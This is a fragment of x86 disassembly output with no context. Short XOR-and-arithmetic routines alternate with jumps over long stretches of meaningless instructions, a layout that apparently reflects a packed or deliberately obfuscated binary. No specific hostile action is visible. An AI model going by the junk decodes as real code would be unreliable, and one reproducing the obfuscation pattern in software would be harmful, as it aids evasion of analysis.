  402a66:	fucomi st,st(7)
  402a68:	xor    al,0x91
  402a6a:	and    esp,eax
  402a6c:	pandn  mm3,QWORD PTR [ebx]
  402a6f:	add    eax,0x6c4b1212
  402a74:	mov    edx,0xeb9dac44
  402a79:	cmp    al,0x2e
  402a7b:	add    al,0xcc
  402a7d:	mov    edi,0xd76c0b42
  402a82:	jo     0x402aec
  402a84:	cwde   
  402a85:	jl     0x402a43
  402a87:	or     edi,DWORD PTR [eax]
  402a89:	test   BYTE PTR [ebx+0xdda6883],bh
  402a8f:	mov    WORD PTR [ebx+eax*8-0x7a86bd43],es
  402a96:	ss scas al,BYTE PTR es:[edi]
  402a98:	xor    al,0x66
  402a9a:	arpl   WORD PTR ds:0x649a186a,bp
  402aa0:	adc    eax,0xcdd45e4d
  402aa5:	loop   0x402a31
  402aa7:	xor    ch,BYTE PTR [edx+0x3f833ae]
  402aad:	jge    0x402a9b
  402aaf:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ab2:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ab9:	mov    dl,BYTE PTR [ebp+0xb]
  402abc:	mov    edi,DWORD PTR [ebp-0x18]
  402abf:	xor    edi,eax
  402ac1:	add    edi,DWORD PTR [ebp-0x14]
  402ac4:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ac7:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ace:	mov    edx,DWORD PTR [ebp-0x44]
  402ad1:	mov    edi,DWORD PTR [ebp-0xc]
  402ad4:	xor    edx,eax
  402ad6:	xor    edi,eax
  402ad8:	add    edx,ecx
  402ada:	add    edi,ecx
  402adc:	imul   edx,edi
  402adf:	add    edx,DWORD PTR [ebp-0x14]
  402ae2:	mov    DWORD PTR [ebp-0x14],edx
  402ae5:	mov    edx,DWORD PTR [ebp-0xc]
  402ae8:	mov    edi,DWORD PTR [ebp-0x24]
  402aeb:	xor    edx,eax
  402aed:	add    edx,ecx
  402aef:	jmp    0x402c0f
  402af4:	mov    dl,0x70
  402af6:	mov    bl,0x55
  402af8:	mov    ch,0x55
  402afa:	push   edx
  402afb:	adc    eax,DWORD PTR [edi-0x6b70897c]
  402b01:	into   
  402b02:	repnz or ebx,DWORD PTR [edx+0x717c7c0d]
  402b09:	jg     0x402b87
  402b0b:	jl     0x402b50
  402b0d:	aad    0x17
  402b0f:	jl     0x402b7c
  402b11:	cdq    
  402b12:	jecxz  0x402b2b
  402b14:	cmp    BYTE PTR [ecx-0x29],al
  402b17:	mov    al,0xb8
  402b19:	adc    ch,bh
  402b1b:	dec    ecx
  402b1c:	mov    bl,0x2
  402b1e:	in     eax,dx
  402b1f:	in     eax,dx
  402b20:	mov    dh,0xed
  402b22:	stos   DWORD PTR es:[edi],eax
  402b23:	popf   
  402b24:	jp     0x402b99
  402b26:	inc    edx
  402b27:	adc    al,0x7b
  402b29:	pushf  
  402b2a:	xchg   esi,eax
  402b2b:	lock gs mov esi,0x1a2dcc22
  402b32:	dec    ecx
  402b33:	(bad)  
  402b34:	je     0x402b76
  402b36:	daa    
  402b37:	fwait
  402b38:	out    dx,al
  402b39:	dec    ecx
  402b3a:	jle    0x402bb8
  402b3c:	popa   
  402b3d:	xchg   DWORD PTR [edx-0x61],edi
  402b40:	xchg   edx,eax
  402b41:	sti    
  402b42:	pand   mm7,QWORD PTR [edx+0x18]
  402b46:	loope  0x402b7f
  402b48:	push   ss
  402b49:	mov    esp,0xed3fa43
  402b4e:	jae    0x402bb8
  402b50:	stos   DWORD PTR es:[edi],eax
  402b51:	in     eax,dx
  402b52:	sti    
  402b53:	add    edx,DWORD PTR [esi]
  402b55:	test   bh,ah
  402b57:	xlat   BYTE PTR ds:[ebx]
  402b58:	ins    BYTE PTR es:[edi],dx
  402b59:	pop    ecx
  402b5a:	pop    edi
  402b5b:	jo     0x402b55
  402b5d:	pusha  
  402b5e:	sbb    edi,esi
  402b60:	xchg   BYTE PTR [eax],bh
  402b62:	scas   eax,DWORD PTR es:[edi]
  402b63:	mov    eax,0x478e10a2
  402b68:	mov    al,ds:0xd9225bd9
  402b6d:	aas    
  402b6e:	test   ebp,edi
  402b70:	hlt    
  402b71:	stc    
  402b72:	jns    0x402bc8
  402b74:	pop    es
  402b75:	or     DWORD PTR [eax],edi
  402b77:	hlt    
  402b78:	ficom  DWORD PTR [eax]
  402b7a:	sub    eax,0x6e805cef
  402b7f:	outs   dx,DWORD PTR ds:[esi]
  402b80:	jnp    0x402b8f
  402b82:	lea    esi,[ecx-0x57]
  402b85:	addr16 fwait
  402b87:	push   edi
  402b88:	nop
  402b89:	add    edi,edx
  402b8b:	mov    bh,0xc0
  402b8d:	or     BYTE PTR [ebx+0x5d461de6],bh
  402b93:	cmp    al,0xde
  402b95:	imul   edx,DWORD PTR [eax],0xb84ad097
  402b9b:	in     eax,0x9e
  402b9d:	mov    bl,0x87
  402b9f:	mov    ah,BYTE PTR [ebp-0x56]
  402ba2:	fsubr  QWORD PTR [eax]
  402ba4:	loop   0x402bae
  402ba6:	dec    edi
  402ba7:	push   esp
  402ba8:	ds jnp 0x402bc0
  402bab:	lock mov DWORD PTR [ebx+0x40],edi
  402baf:	(bad)  
  402bb0:	out    dx,eax
  402bb1:	fs ror ecx,1
  402bb4:	push   ds
  402bb5:	jl     0x402b59
  402bb7:	mov    esi,0xcf8b10af
  402bbc:	fisttp WORD PTR [ebx+esi*4+0x3fd60059]
  402bc3:	fild   WORD PTR [edi]
  402bc5:	lods   eax,DWORD PTR ds:[esi]
  402bc6:	jmp    0xf244:0xfe8ef379
  402bcd:	sahf   
  402bce:	test   BYTE PTR [ebx+0x777b2454],al
  402bd4:	clc    
  402bd5:	rcr    DWORD PTR [eax-0x74],0x86
  402bd9:	call   0x2b4a1a53
  402bde:	mov    edi,0x373c9b34
  402be3:	dec    edi
  402be4:	sub    ah,0x90
  402be7:	bnd js 0x402c21
  402bea:	int3   
  402beb:	push   edi
  402bec:	inc    ebp
  402bed:	mov    WORD PTR [ebp+0x2f],ds
  402bf0:	jg     0x402c5e
  402bf2:	lock repz mov ebp,0xd81717f4
  402bf9:	hlt    
  402bfa:	icebp  
  402bfb:	aaa    
  402bfc:	int    0x90
  402bfe:	or     BYTE PTR [ebx],cl
  402c00:	xchg   esp,eax
  402c01:	mov    esp,0x5b5cd9ed
  402c06:	jo     0x402b91
  402c08:	or     al,BYTE PTR [ebx]
  402c0a:	pop    es
  402c0b:	pop    es
  402c0c:	inc    ebp
  402c0d:	push   0xd7af0fac
  402c12:	mov    edi,DWORD PTR [ebp-0xc]
  402c15:	xor    edi,eax
  402c17:	sub    edx,edi
  402c19:	mov    edi,DWORD PTR [ebp-0xc]
  402c1c:	mov    ebx,DWORD PTR [ebp-0x14]
  402c1f:	xor    edi,eax
  402c21:	add    edi,ecx
  402c23:	imul   edi,ebx
  402c26:	mov    ebx,DWORD PTR [ebp-0x18]
  402c29:	xor    ebx,eax
  402c2b:	sub    edx,ecx
  402c2d:	lea    edi,[edi+ebx*1+0x32729e]
  402c34:	cmp    edi,edx
  402c36:	jbe    0x40295a
  402c3c:	mov    edx,DWORD PTR [ebp-0xc]
  402c3f:	mov    edi,DWORD PTR [ebp-0x24]
  402c42:	xor    edx,eax
  402c44:	add    edx,ecx
  402c46:	imul   edx,edi
  402c49:	mov    edi,DWORD PTR [ebp-0x18]
  402c4c:	xor    edi,eax
  402c4e:	add    edx,edi
  402c50:	mov    edi,DWORD PTR [ebp-0x8]
  402c53:	lea    edx,[edx+edi*1+0x32729e]
  402c5a:	mov    DWORD PTR [ebp-0x8],edx
  402c5d:	mov    edx,DWORD PTR [ebp-0x20]
  402c60:	xor    edx,eax
  402c62:	mov    edi,0xffcd8d62
  402c67:	sub    edi,edx
  402c69:	add    edi,DWORD PTR [ebp-0x10]
  402c6c:	mov    edx,DWORD PTR [ebp-0x20]
  402c6f:	mov    ebx,DWORD PTR [ebp-0x8]
  402c72:	xor    edx,eax
  402c74:	add    edx,ecx
  402c76:	imul   edx,ebx
  402c79:	cmp    edx,edi
  402c7b:	jbe    0x40217b
  402c81:	pop    ebx
  402c82:	pop    edi
  402c83:	leave  
  402c84:	ret    0x8
  402c87:	push   ebp
  402c88:	mov    ebp,esp
  402c8a:	jmp    0x402d8c
  402c8f:	test   al,0x6e
  402c91:	iret   
  402c92:	clc    
  402c93:	fnstsw WORD PTR [ebp-0x55]
  402c96:	outs   dx,BYTE PTR ds:[esi]
  402c97:	ret    
  402c98:	popf   
  402c99:	aam    0x5e
  402c9b:	or     BYTE PTR [ebp+0xc9fec1a],bh
  402ca1:	jl     0x402d1f
  402ca3:	push   ebx
  402ca4:	jl     0x402d22
  402ca6:	jl     0x402c84
  402ca8:	(bad)  
  402ca9:	mov    eax,ds:0x555b096f
  402cae:	call   0xacb3:0xae94a3f5
  402cb5:	cli    
  402cb6:	icebp  
  402cb7:	jmp    0x402ce0
  402cb9:	gs push ds
  402cbb:	sbb    DWORD PTR [edx-0x41d8f29],esp
  402cc1:	xchg   edx,eax
  402cc2:	(bad)  
  402cc3:	in     al,0x15
  402cc5:	sub    ah,BYTE PTR [ecx+0xd5cea22]
  402ccb:	and    esi,DWORD PTR [esi]
  402ccd:	xor    ch,dl
  402ccf:	mov    ebx,0xebbf2687
  402cd4:	neg    BYTE PTR [ebx]
  402cd6:	fdivr  QWORD PTR [ebx-0x7a8cb692]
  402cdc:	xor    eax,0x1e466062
  402ce1:	sub    eax,0xbdc3675b
  402ce6:	icebp  
  402ce7:	sub    bh,ah
  402ce9:	jo     0x402d2a
  402ceb:	fadd   DWORD PTR [edx+ecx*1-0x5c0012c6]
  402cf2:	jge    0x402c80
  402cf4:	add    dl,BYTE PTR [eax]
  402cf6:	sub    eax,0xe7b14a1
  402cfb:	popa   
  402cfc:	push   edx
  402cfd:	mov    dl,0x2f
  402cff:	pop    esi
  402d00:	sbb    eax,0xcc539b8c
  402d05:	add    BYTE PTR [edx-0x6e],bl
  402d08:	jp     0x402ca4
  402d0a:	ja     0x402cab
  402d0c:	mov    eax,0xe8c5fb5f
  402d11:	scas   al,BYTE PTR es:[edi]
  402d12:	xchg   ebx,eax
  402d13:	dec    ebp
  402d14:	ja     0x402cd0
  402d16:	(bad)  
  402d17:	int3   
  402d18:	(bad)  
  402d19:	push   ebp
  402d1a:	and    DWORD PTR cs:[edx-0x2d6b478f],ebx
  402d21:	loop   0x402d50
  402d23:	shr    DWORD PTR [edi+ecx*2+0x2a4f1705],0x14
  402d2b:	xchg   esp,eax
  402d2c:	je     0x402d01
  402d2e:	xchg   ebp,eax
  402d2f:	ds popf 
  402d31:	in     eax,dx
  402d32:	stc    
  402d33:	js     0x402ce5
  402d35:	cmc    
  402d36:	inc    esi
  402d37:	inc    edi
  402d38:	imul   eax,DWORD PTR [ebx-0x37],0xffffffa6
  402d3c:	and    ah,BYTE PTR [ebp+0x21]
  402d3f:	mov    DWORD PTR [eax+0x43],ebx
  402d42:	shl    BYTE PTR ds:0x7fcf993e,0x2d
  402d49:	stos   DWORD PTR es:[edi],eax
  402d4a:	mov    ds:0x36bec34b,al
  402d4f:	inc    ebx
  402d50:	or     eax,DWORD PTR [edi-0xd56e2c2]
  402d56:	ret    0x17ca
  402d59:	pushf  
  402d5a:	fcom   DWORD PTR [ebx-0x23]
  402d5d:	pop    edx
  402d5e:	fnsave [esi-0x79]
  402d61:	dec    edi
  402d62:	int3   
  402d63:	and    eax,0x54df411
  402d68:	clc    
  402d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d6a:	mov    ch,0xc
  402d6c:	mov    edx,0x5d7a0860
  402d71:	fwait
  402d72:	inc    ecx
  402d73:	push   esp
  402d74:	outs   dx,BYTE PTR ds:[esi]
  402d75:	lods   eax,DWORD PTR ds:[esi]
  402d76:	aad    0x58
  402d78:	or     esi,DWORD PTR ds:0x1c89a30b
  402d7e:	test   eax,0xc29a3e0
  402d83:	add    al,0x93
  402d86:	hlt    
  402d87:	xchg   ebp,eax
  402d88:	scas   al,BYTE PTR es:[edi]
  402d89:	push   0x2351b04d
  402d8e:	adc    eax,0x4275a8
  402d93:	push   ecx
  402d94:	and    DWORD PTR ds:0x427d1f,edi
  402d9a:	mov    eax,0xf89c8535
  402d9f:	mov    ecx,DWORD PTR ds:0x4278ab
  402da5:	mov    ecx,DWORD PTR [ecx]
  402da7:	xor    DWORD PTR ds:0x42c89a,ecx
  402dad:	mov    DWORD PTR [ebp-0x8],eax
  402db0:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402db7:	jmp    0x402eb9
  402dbc:	aas    
  402dbd:	enter  0x7aef,0xfb
  402dc1:	jge    0x402e10
  402dc3:	jge    0x402db3
  402dc5:	int    0x4c
  402dc7:	jae    0x402d59
  402dc9:	xchg   BYTE PTR [ecx+0x23],ah
  402dcc:	haddps xmm7,XMMWORD PTR [ebx+edx*2+0x7c]
  402dd2:	jl     0x402e50
  402dd4:	mov    dh,0x95
  402dd6:	cmp    esi,DWORD PTR [edi]
  402dd8:	push   es
  402dd9:	pop    di
  402ddb:	jo     0x402d87
  402ddd:	out    dx,al
  402dde:	jl     0x402dd5
  402de0:	lock mul BYTE PTR [eax-0x7c]
  402de4:	and    DWORD PTR [ebx+edx*1],edi
  402de7:	popf   
  402de8:	imul   ebx,DWORD PTR [edi],0x4a231f8e
  402dee:	and    eax,0x1a5e0475
  402df3:	cmp    DWORD PTR [edi+0x33],edx
  402df6:	jp     0x402dd3
  402df8:	sbb    al,0x9d
  402dfa:	push   0x50
  402dfc:	jl     0x402d80
  402dfe:	(bad)  
  402dff:	sti    
  402e00:	ins    BYTE PTR es:[edi],dx
  402e01:	xchg   ebx,eax
  402e02:	imul   eax,eax,0x61
  402e05:	lods   al,BYTE PTR ds:[esi]
  402e06:	(bad)  
  402e07:	mov    ebx,0xaec8cc7b
  402e0c:	dec    ebx
  402e0d:	pop    esp
  402e0e:	minps  xmm6,XMMWORD PTR ds:0xc1ba9e14
  402e15:	ins    DWORD PTR es:[edi],dx
  402e16:	xchg   BYTE PTR [edx+0x7147e7f4],bl
  402e1c:	ret    0x1f6b
  402e1f:	xchg   esi,eax
  402e20:	mov    bh,0x2d
  402e22:	adc    bl,BYTE PTR [ecx]
  402e24:	cs popf 
  402e26:	pop    ecx
  402e27:	outs   dx,BYTE PTR ds:[esi]
  402e28:	fs cli 
  402e2a:	dec    esi
  402e2b:	push   ebp
  402e2c:	push   edx
  402e2d:	repnz test DWORD PTR [edi+0x5b6c8f91],ecx
  402e34:	sbb    BYTE PTR [ecx-0x73],ch
  402e37:	out    0x4a,eax
  402e39:	fimul  DWORD PTR [esi]
  402e3b:	es xchg edi,eax
  402e3d:	push   es
  402e3e:	ins    BYTE PTR es:[edi],dx
  402e3f:	xchg   edx,eax
  402e40:	les    esi,FWORD PTR [esi-0x4b]
  402e43:	xor    edi,DWORD PTR [ecx+0x4e]
  402e46:	mov    bl,0x25
  402e48:	xchg   edi,ebx
  402e4a:	mov    eax,0x6853e66b
  402e4f:	adc    ebp,DWORD PTR [eax]
  402e51:	(bad)  
  402e52:	lods   al,BYTE PTR ds:[esi]
  402e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e54:	sub    DWORD PTR [eax-0x3caaf355],edi
  402e5a:	ja     0x402e8a
  402e5c:	pusha  
  402e5d:	jmp    0xd5dc9b05
  402e62:	test   BYTE PTR [eax+0x710d029b],0xb9
  402e69:	(bad)  
  402e6a:	mov    BYTE PTR [bp+di],dl
  402e6d:	adc    ah,BYTE PTR ds:0x7b0b4e7c
  402e73:	cld    
  402e74:	jne    0x402e16
  402e76:	mov    WORD PTR [esi+0x66d76516],ds
  402e7c:	lahf   
  402e7d:	pop    esp
  402e7e:	aam    0x93
  402e80:	(bad)  
  402e81:	rcr    BYTE PTR [esi],cl
  402e83:	cld    
  402e84:	cmp    eax,0x630a0067
  402e89:	cld    
  402e8a:	xchg   ebx,eax
  402e8b:	and    BYTE PTR [esi+0x3e],ch
  402e8e:	cmp    al,0x57
  402e90:	pop    ds
  402e91:	cmc    
  402e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e93:	cmp    dl,0x16
  402e96:	pop    edx
  402e97:	(bad)  
  402e99:	jle    0x402ee7
  402e9b:	push   0x5f0d8663
  402ea0:	mov    dl,0x8
  402ea2:	aaa    
  402ea3:	jge    0x402ed9
  402ea5:	fisttp WORD PTR [edx-0x3b]
  402ea8:	mov    ebx,ss
  402eaa:	shr    DWORD PTR [ebp+0x4a],cl
  402ead:	fild   DWORD PTR [eax-0x23e9e65f]
  402eb3:	dec    edi
  402eb4:	lea    ecx,[ecx]
  402eb6:	xlat   BYTE PTR ds:[ebx]
  402eb7:	shr    DWORD PTR [eax-0x75],1
  402eba:	push   ebp
  402ebb:	clc    
  402ebc:	neg    DWORD PTR ds:0x4275a0
  402ec2:	push   esi
  402ec3:	jmp    0x402fc5
  402ec8:	xor    BYTE PTR [eax-0x3f],cl
  402ecb:	aaa    
  402ecc:	pop    ecx
  402ecd:	pop    ebp
  402ece:	fimul  DWORD PTR [ebx+0xf]
  402ed1:	mov    eax,ds:0x3a1c860b
  402ed6:	out    0xf6,al
  402ed8:	jmp    0x53bcaaeb
  402edd:	jl     0x402f5b
  402edf:	jl     0x402ee5
  402ee1:	iret   
  402ee2:	imul   ebx,DWORD PTR [ebx],0x52
  402ee5:	xlat   BYTE PTR ds:[ebx]
  402ee6:	daa    
  402ee7:	aad    0xc6
  402ee9:	inc    edx
  402eea:	lods   eax,DWORD PTR ds:[esi]
  402eeb:	in     al,0x64
  402eed:	sysenter 
  402eef:	aaa    
  402ef0:	loope  0x402e7b
  402ef2:	enter  0xa9fe,0x72
  402ef6:	push   ecx
  402ef7:	mov    es,ebx
  402ef9:	inc    ebp
  402efa:	fcomip st,st(4)
  402efc:	push   esi
  402efd:	push   0xffffff85
  402eff:	and    ch,BYTE PTR [ebx-0x7f]
  402f02:	(bad)  
  402f03:	xchg   ebp,eax
  402f04:	clc    
  402f05:	inc    eax
  402f06:	fmulp  st(7),st
  402f08:	fs sub al,0xaa
  402f0b:	(bad)  
  402f0c:	adc    eax,0x19c67e98
  402f11:	int3   
  402f12:	or     eax,0xf05bd541
  402f17:	mov    ecx,0x461dafa0
  402f1c:	cmp    dl,BYTE PTR ds:0xd0ca0af9
  402f22:	dec    ecx
  402f23:	lahf   
  402f24:	and    DWORD PTR [eax+0x5b],0xe62364e8
  402f2b:	aaa    
  402f2c:	sub    edi,DWORD PTR [esi]
  402f2e:	mov    ebx,0x16af507b
  402f33:	cmp    bl,BYTE PTR ds:0xe047fd6c
  402f39:	push   esp
  402f3a:	outs   dx,BYTE PTR ds:[esi]
  402f3b:	jge    0x402f40
  402f3d:	push   esi
  402f3e:	or     DWORD PTR [edx+0x7a],0x195308e4
  402f45:	(bad)  
  402f46:	push   eax
  402f47:	push   edx
  402f48:	push   ecx
  402f49:	and    edx,edx
  402f4b:	out    0xf4,al
  402f4d:	pop    esi
  402f4e:	scas   eax,DWORD PTR es:[edi]
  402f4f:	cmp    al,0xd8
  402f51:	xchg   esi,eax
  402f52:	adc    dl,bl
  402f54:	xor    al,0x44
  402f56:	(bad)  
  402f57:	scas   al,BYTE PTR es:[edi]
  402f58:	adc    esi,DWORD PTR [eax-0x55ca505d]
  402f5e:	mov    al,ds:0xc7629d07
  402f63:	xor    DWORD PTR [esi+0x3c8c9c8],ecx
  402f69:	push   ebx
  402f6a:	xor    BYTE PTR [ebx],dh
  402f6c:	jmp    0x402f19
  402f6e:	mov    al,ds:0x76a2bae9
  402f73:	popf   
  402f74:	nop
  402f75:	and    eax,DWORD PTR ds:0x38cda577
  402f7b:	mov    BYTE PTR ds:0xa36ddeef,bh
  402f81:	and    cl,BYTE PTR ss:[ecx]
  402f84:	sbb    DWORD PTR [eax-0x2],esi
  402f87:	pop    ds
  402f88:	in     eax,0xb4
  402f8a:	push   ebx
  402f8b:	push   eax
  402f8c:	dec    ebx
  402f8d:	push   0xf75edd9a
  402f92:	ret    
  402f93:	js     0x40300c
  402f95:	and    eax,0xa537eff7
  402f9a:	(bad)  
  402f9b:	rcr    BYTE PTR [ebx-0x9],1
  402f9e:	pop    esp
  402f9f:	cmp    DWORD PTR [edx+eax*4+0x770325b3],esi
  402fa6:	popf   
  402fa7:	mov    cl,0x25
  402fa9:	adc    edi,DWORD PTR [esi-0x22]
  402fac:	pop    ebp
  402fad:	cmp    BYTE PTR [ebx],dh
  402faf:	stc    
  402fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fb1:	into   
  402fb2:	shl    ebp,cl
  402fb4:	(bad)  
  402fb6:	pop    eax
  402fb7:	mov    bh,BYTE PTR [edx+0x55e7b49]
  402fbd:	mov    dl,0xd3
  402fbf:	and    ebp,DWORD PTR [edx+0x5ee21d38]
  402fc5:	mov    ecx,0x7510857
  402fca:	jmp    0x4030cc
  402fcf:	xlat   BYTE PTR ds:[ebx]
  402fd0:	push   ebp
  402fd1:	imul   ebp,DWORD PTR [eax+0x6d],0xe255ed68
  402fd8:	xor    ecx,DWORD PTR [ecx]
  402fda:	xchg   edx,eax
  402fdb:	inc    ecx
  402fdc:	stos   DWORD PTR es:[edi],eax
  402fdd:	bsf    ecx,esp
  402fe0:	add    DWORD PTR [esp+edi*2+0x53],edi
  402fe4:	jl     0x403062
  402fe6:	jl     0x402ff2
  402fe8:	mov    dl,0x88
  402fea:	inc    ecx
  402feb:	pop    eax
  402fec:	dec    edi
  402fed:	das    
  402fee:	sbb    ebp,DWORD PTR [ebp-0x1a]
  402ff1:	sbb    eax,0x3c6ed6a6
  402ff6:	sahf   
  402ff7:	sub    al,0xd
  402ff9:	mov    ds:0xb53fb55,al
  402ffe:	jnp    0x402fd6
  403000:	jmp    0xdc6b:0x2967f248
  403007:	ins    DWORD PTR es:[edi],dx
  403008:	cmp    ch,cl
  40300a:	stos   DWORD PTR es:[edi],eax
  40300b:	adc    BYTE PTR [edi+0x67],0x44
  40300f:	mov    al,0xb
  403011:	ficomp WORD PTR [edx]
  403013:	push   0xb
  403015:	dec    ebx
  403016:	jnp    0x40300f
  403018:	xchg   edx,eax
  403019:	shl    ah,1
  40301b:	jne    0x403030
  40301d:	xchg   BYTE PTR [edi-0x414fb6f2],dh
  403023:	push   cs
  403024:	adc    DWORD PTR [ecx+0x62],esp
  403027:	jae    0x403073
  403029:	popf   
  40302a:	adc    ebp,DWORD PTR ds:0x3106889
  403030:	in     al,0xe0
  403032:	mov    BYTE PTR [eax],cl
  403034:	std    
  403035:	mov    dl,0xa8
  403037:	pop    esi
  403038:	adc    eax,0x4c530c1d
  40303d:	mov    edx,0x62421701
  403042:	out    dx,al
  403043:	push   cs
  403044:	mov    ebp,gs
  403046:	(bad)  
  403047:	dec    esi
  403048:	xor    DWORD PTR [edi+ebp*4],0xffffffc9
  40304c:	scas   eax,DWORD PTR es:[edi]
  40304d:	xchg   edx,eax
  40304e:	xchg   DWORD PTR [edx-0xb4ea4cf],ebp
  403054:	dec    edi
  403055:	cmc    
  403056:	xor    edx,DWORD PTR [ecx+0x4d45f4d1]
  40305c:	xor    bl,BYTE PTR [eax+0x36394fca]
  403062:	pop    esi
  403063:	xchg   DWORD PTR [edi],ebx
  403065:	xchg   edi,eax
  403066:	jbe    0x403032
  403068:	lds    ecx,FWORD PTR [edi+0x7e580937]
  40306e:	push   ss
  40306f:	add    ecx,0x23
  403072:	jg     0x403069
  403074:	(bad)  
  403075:	aam    0xf
  403077:	jb     0x403020
  403079:	stos   DWORD PTR es:[edi],eax
  40307a:	xor    DWORD PTR [ecx+0x16],edi
  40307d:	cmp    eax,0xbe77be4f
  403082:	mov    esi,0x80b5581a
  403087:	lods   al,BYTE PTR ds:[esi]
  403088:	inc    eax
  403089:	test   BYTE PTR ds:0x691a59b4,dl
  40308f:	addr16 sbb eax,0xa5cac4e1
  403095:	mov    eax,ds:0xb63745ef
  40309a:	test   al,0xb9
  40309c:	pop    eax
  40309d:	dec    ebp
  40309e:	push   0xffda1628
  4030a3:	pusha  
  4030a4:	xlat   BYTE PTR ds:[ebx]
  4030a5:	xor    DWORD PTR [ebp-0x5381b136],ecx
  4030ab:	mov    eax,DWORD PTR [esi-0x28]
  4030ae:	push   eax
  4030af:	push   esp
  4030b0:	adc    BYTE PTR [esi+0x37],0xd0
  4030b4:	mov    ebp,0x1773c229
  4030b9:	out    dx,eax
  4030ba:	test   BYTE PTR [ebx-0x38fa1a35],bl
  4030c0:	sar    DWORD PTR [eax-0x783382ce],cl
  4030c6:	fsubrp st(5),st
  4030c8:	fiadd  DWORD PTR [eax-0x2ecca4d3]
  4030ce:	mov    esi,DWORD PTR ds:0x4292a5
  4030d4:	or     DWORD PTR ds:0x4275a8,esi
  4030da:	mov    esi,0x32729e
  4030df:	push   edi
  4030e0:	mov    edi,DWORD PTR [ebp+0x10]
  4030e3:	sub    DWORD PTR ds:0x42c88e,0x427d17
  4030ed:	add    edx,esi
  4030ef:	cmp    edi,edx
  4030f1:	jmp    0x4031f3
  4030f6:	in     eax,0x90
  4030f8:	ds std 
  4030fa:	inc    ecx
  4030fb:	jge    0x4030fa
  4030fd:	test   al,0xb1
  4030ff:	test   BYTE PTR [ebx],0x86
  403102:	mov    bh,0x84
  403104:	rcr    BYTE PTR [esi+0x7c7c0023],1
  40310a:	push   ebx
  40310b:	jl     0x403189
  40310d:	jl     0x4030ee
  40310f:	pop    eax
  403110:	mov    eax,ds:0x91cbce7d
  403115:	ss sbb ebp,edx
  403118:	xor    esp,esp
  40311a:	ficomp WORD PTR [eax-0x1a]
  40311d:	or     DWORD PTR [esi],ecx
  40311f:	and    eax,0x85bf478e
  403124:	scas   eax,DWORD PTR es:[edi]
  403125:	xor    edx,DWORD PTR [esi]
  403127:	dec    ecx
  403128:	inc    ebx
  403129:	inc    ebp
  40312a:	or     BYTE PTR [eax+0x356b141e],dh
  403130:	and    al,BYTE PTR [ebx+0x5b]
  403133:	jle    0x40319f
  403135:	pop    ss
  403136:	sub    edx,DWORD PTR [ebp-0x42]
  403139:	retf   0x5ea7
  40313c:	ret    0x9b78
  40313f:	cmp    eax,0x2f8cca4b
  403144:	into   
  403145:	mov    esp,DWORD PTR [eax]
  403147:	psrad  mm3,QWORD PTR [esp+ecx*8]
  40314b:	pop    edi
  40314c:	xchg   ebp,eax
  40314d:	sbb    esp,DWORD PTR [edi]
  40314f:	mov    dl,al
  403151:	cmp    edi,DWORD PTR [esi-0x32]
  403154:	retf   0xaed5
  403157:	fld    TBYTE PTR [edi+eax*4+0x24]
  40315b:	cmp    eax,0x3c64799d
  403160:	mov    ebx,0xa4b737ab
  403165:	cmp    DWORD PTR [ebx-0x2b],ecx
  403168:	fstp   TBYTE PTR [ebx+0x5d]
  40316b:	fld    TBYTE PTR [edi+0x3270c01a]
  403171:	jl     0x403103
  403173:	sub    BYTE PTR [ecx],ah
  403175:	jbe    0x403114
  403177:	ret    
  403178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403179:	adc    dl,bl
  40317b:	jne    0x403150
  40317d:	push   ebx
  40317e:	shr    al,cl
  403180:	sub    eax,0x2ff24c64
  403185:	sbb    edi,ebp
  403187:	jns    0x4031cb
  403189:	jae    0x403137
  40318b:	pop    ebx
  40318c:	std    
  40318d:	mov    BYTE PTR [edx-0x50],dh
  403190:	imul   eax,DWORD PTR [ecx+edi*8+0x75],0x21caa024
  403198:	mov    bl,0x74
  40319a:	sub    BYTE PTR [eax+esi*2-0x49a6cc0e],ch
  4031a1:	mov    cl,0xde
  4031a3:	xchg   esp,eax
  4031a4:	cs xchg ebp,eax
  4031a6:	jmp    0x7476:0x582f02f3
  4031ad:	les    ebp,FWORD PTR [esi-0x40]
  4031b0:	sbb    al,0x3b
  4031b2:	sti    
  4031b3:	and    DWORD PTR [esi-0x96e2b17],0x96466342
  4031bd:	scas   eax,DWORD PTR es:[edi]
  4031be:	xchg   edx,eax
  4031bf:	mov    esi,0xe1ae261
  4031c4:	dec    ebp
  4031c5:	and    al,0xe3
  4031c7:	jmp    0x40319b
  4031c9:	jp     0x40322c
  4031cb:	jno    0x403155
  4031cd:	popf   
  4031ce:	xchg   DWORD PTR [edi+edi*8],esi
  4031d1:	adc    al,0xce
  4031d3:	stos   DWORD PTR es:[edi],eax
  4031d4:	mov    eax,ds:0x9f34ac80
  4031d9:	sub    ebx,esi
  4031db:	pop    ecx
  4031dc:	data16 and al,0x93
  4031df:	pushf  
  4031e0:	or     BYTE PTR [edx],ch
  4031e2:	or     al,0x4b
  4031e4:	dec    eax
  4031e5:	and    ecx,DWORD PTR [eax-0x7]
  4031e8:	mov    ah,0xa3
  4031ea:	stos   BYTE PTR es:[edi],al
  4031eb:	cs ss mov edx,0x3698d7cb
  4031f2:	das    
  4031f3:	je     0x4034f0
  4031f9:	adc    edi,DWORD PTR ds:0x4292c1
  4031ff:	mov    edx,DWORD PTR [ebp-0x8]
  403202:	mov    eax,DWORD PTR [ebp-0x4]
  403205:	xor    eax,ecx
  403207:	and    DWORD PTR ds:0x4275a0,0x0
  403211:	jmp    0x403223
  403216:	mov    edi,DWORD PTR ds:0x4275a0
  40321c:	inc    edi
  40321d:	mov    DWORD PTR ds:0x4275a0,edi
  403223:	cmp    DWORD PTR ds:0x4275a0,0x1e
  40322a:	jae    0x40326d
  403230:	cmp    DWORD PTR ds:0x4275a0,0xa
  403237:	jne    0x403248
  40323d:	push   0x444a
  403242:	call   DWORD PTR ds:0x4279cb
  403248:	cmp    DWORD PTR ds:0x4275a0,0x9
  40324f:	jne    0x403262
  403255:	mov    edi,DWORD PTR ds:0x4275a0
  40325b:	inc    edi
  40325c:	mov    DWORD PTR ds:0x4275a0,edi
